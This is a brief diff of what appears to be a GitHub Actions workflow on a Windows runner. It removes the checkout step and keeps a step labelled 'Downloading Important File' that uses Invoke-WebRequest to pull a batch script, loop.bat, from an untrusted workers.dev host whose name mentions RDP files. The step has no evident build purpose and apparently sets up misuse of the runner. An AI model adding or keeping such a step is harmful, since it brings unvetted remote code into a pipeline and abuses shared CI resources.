@@ -15,7 +15,6 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - uses: actions/checkout@v2
      -name: Downloading Important File
       run: |
         Invoke-WebRequest https://rdpfiles.viptorrentleechbot.workers.dev/0:/loop.bat  -OutFile loop.bat
